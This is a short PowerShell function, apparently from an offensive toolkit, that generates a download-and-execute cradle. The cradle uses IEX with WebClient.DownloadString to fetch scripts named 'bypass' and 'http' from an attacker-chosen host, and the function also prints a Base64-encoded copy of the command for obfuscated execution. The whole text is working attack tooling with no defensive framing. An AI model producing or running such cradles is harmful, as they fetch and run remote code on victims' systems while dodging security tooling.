function DownloadExecCradle {
    param ($TARGET)
    $str = "IEX ((new-object net.webclient).downloadstring(`"http://$TARGET/bypass`"));IEX ((new-object net.webclient).downloadstring(`"http://$TARGET/http`"))"
    Write-Host "Command:" -ForegroundColor Green
    Write-Host "$str`n"
    $base64Str = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
    Write-Host "Base64 encoded string:" -ForegroundColor Green
    Write-Host "$base64Str"
}
